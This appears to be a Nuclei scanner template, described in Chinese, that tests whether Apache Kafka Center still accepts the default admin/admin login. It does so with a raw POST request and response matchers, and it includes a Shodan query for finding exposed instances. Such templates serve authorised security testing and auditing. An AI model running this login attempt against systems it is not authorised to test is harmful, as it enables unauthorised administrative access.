id: kafka-center-default-login

info:
  name: Apache Kafka Center 默认口令登录（弱口令）
  author: dhiyaneshDK
  severity: high
  description: 该模板通过尝试 Apache Kafka Center 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://developer.ibm.com/tutorials/kafka-authn-authz/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
    shodan-query: http.title:"Kafka Center"
  tags: kafka,default-login,vuln

http:
  - raw:
      - |
        POST /login/system HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"name":"{{username}}","password":"{{password}}","checkbox":false}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"code":200'
          - '"name":"admin"'
        condition: and

      - type: status
        status:
          - 200
